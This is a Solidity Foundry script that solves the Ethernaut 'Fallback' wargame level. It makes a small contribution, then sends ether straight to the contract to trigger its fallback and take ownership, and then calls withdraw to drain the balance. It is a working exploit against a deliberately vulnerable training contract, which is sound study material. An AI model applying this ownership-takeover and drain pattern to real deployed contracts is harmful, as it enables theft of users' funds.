// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IFallback } from "ethernaut/01-fallback/IFallback.sol";

contract FallbackScript is Script {
    function run() external payable {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address fallbackAddr = vm.envAddress("L01_FALLBACK_ADDRESS");
        IFallback fallBack = IFallback(payable(fallbackAddr));

        // Step 1: send 0.0001 ether to set `contributions[msg.sender]` > 0 ether
        bool success;
        // solhint-disable-next-line avoid-low-level-calls
        (success,) = address(fallBack).call{value: 0.0001 ether}(abi.encodeCall(fallBack.contribute, ()));

        // Step 2: send ether, bypass `contributions[msg.sender] > 0 ether` & get ownership
        // solhint-disable-next-line avoid-low-level-calls
        (success,) = address(fallBack).call{value: 0.0001 ether}("");

        // Step 3: withdraw
        fallBack.withdraw();

        vm.stopBroadcast();
    }
}
